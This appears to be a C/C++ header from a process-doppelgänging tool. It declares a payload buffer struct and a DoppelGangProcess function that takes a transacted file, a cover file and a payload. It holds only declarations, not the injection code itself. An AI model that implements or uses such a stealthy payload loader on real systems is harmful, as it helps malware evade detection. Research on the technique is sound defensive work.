#pragma once


#define PS_INHERIT_HANDLES 4

struct payload_data {
	DWORD size;
	BYTE* buf = NULL;
};

void DoppelGangProcess(CHAR* transactFile, WCHAR* coverFile, payload_data payload);
